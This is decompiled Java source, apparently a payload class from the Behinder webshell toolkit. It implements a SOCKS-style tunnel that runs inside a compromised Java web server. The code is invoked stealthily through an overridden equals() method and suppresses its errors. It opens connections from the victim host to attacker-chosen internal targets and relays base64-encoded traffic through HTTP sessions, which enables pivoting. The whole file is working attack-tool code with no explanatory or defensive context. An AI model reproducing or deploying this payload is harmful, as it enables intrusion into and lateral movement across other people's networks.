// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpSession;
import java.nio.ByteBuffer;
import java.io.IOException;
import java.net.UnknownHostException;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.nio.channels.SocketChannel;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.jsp.PageContext;

public class SocksProxy
{
    public static String cmd;
    public static String targetIP;
    public static String targetPort;
    public static String extraData;
    
    public static void main(final String[] args) {
    }
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        try {
            this.proxy(page);
        }
        catch (Exception ex) {}
        return true;
    }
    
    public void proxy(final PageContext page) throws Exception {
        final HttpServletRequest request = (HttpServletRequest)page.getRequest();
        final HttpServletResponse response = (HttpServletResponse)page.getResponse();
        final HttpSession session = page.getSession();
        if (SocksProxy.cmd != null) {
            if (SocksProxy.cmd.compareTo("CONNECT") == 0) {
                try {
                    final String target = SocksProxy.targetIP;
                    final int port = Integer.parseInt(SocksProxy.targetPort);
                    final SocketChannel socketChannel = SocketChannel.open();
                    socketChannel.connect(new InetSocketAddress(target, port));
                    socketChannel.configureBlocking(false);
                    session.setAttribute("socket", (Object)socketChannel);
                    response.setStatus(200);
                }
                catch (UnknownHostException e) {
                    final ServletOutputStream so = response.getOutputStream();
                    so.write(new byte[] { 55, 33, 73, 54 });
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                }
                catch (IOException e2) {
                    final ServletOutputStream so = response.getOutputStream();
                    so.write(new byte[] { 55, 33, 73, 54 });
                    so.write(e2.getMessage().getBytes());
                    so.flush();
                    so.close();
                }
            }
            else if (SocksProxy.cmd.compareTo("DISCONNECT") == 0) {
                final SocketChannel socketChannel2 = (SocketChannel)session.getAttribute("socket");
                try {
                    socketChannel2.socket().close();
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                }
                session.removeAttribute("socket");
            }
            else if (SocksProxy.cmd.compareTo("READ") == 0) {
                final SocketChannel socketChannel2 = (SocketChannel)session.getAttribute("socket");
                try {
                    final ByteBuffer buf = ByteBuffer.allocate(512);
                    int bytesRead = socketChannel2.read(buf);
                    final ServletOutputStream so2 = response.getOutputStream();
                    while (bytesRead > 0) {
                        so2.write(buf.array(), 0, bytesRead);
                        so2.flush();
                        buf.clear();
                        bytesRead = socketChannel2.read(buf);
                    }
                    so2.flush();
                    so2.close();
                }
                catch (Exception e3) {
                    response.setStatus(200);
                    final ServletOutputStream so3 = response.getOutputStream();
                    so3.write(new byte[] { 55, 33, 73, 54 });
                    so3.write(e3.getMessage().getBytes());
                    so3.flush();
                    so3.close();
                    page.getOut().clear();
                    socketChannel2.socket().close();
                    e3.printStackTrace();
                }
            }
            else if (SocksProxy.cmd.compareTo("FORWARD") == 0) {
                final SocketChannel socketChannel2 = (SocketChannel)session.getAttribute("socket");
                try {
                    final byte[] extraDataByte = this.base64decode(SocksProxy.extraData);
                    final ByteBuffer buf2 = ByteBuffer.allocate(extraDataByte.length);
                    buf2.clear();
                    buf2.put(extraDataByte);
                    buf2.flip();
                    while (buf2.hasRemaining()) {
                        socketChannel2.write(buf2);
                    }
                }
                catch (Exception e3) {
                    final ServletOutputStream so3 = response.getOutputStream();
                    so3.write(new byte[] { 55, 33, 73, 54 });
                    so3.write(e3.getMessage().getBytes());
                    so3.flush();
                    so3.close();
                    socketChannel2.socket().close();
                }
            }
        }
        page.getOut().clear();
    }
    
    private byte[] base64decode(final String text) throws Exception {
        final String version = System.getProperty("java.version");
        byte[] result = null;
        try {
            if (version.compareTo("1.9") >= 0) {
                this.getClass();
                final Class Base64 = Class.forName("java.util.Base64");
                final Object Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
                result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
            }
            else {
                this.getClass();
                final Class Base64 = Class.forName("sun.misc.BASE64Decoder");
                final Object Decoder = Base64.newInstance();
                result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
            }
        }
        catch (Exception ex) {}
        return result;
    }
}
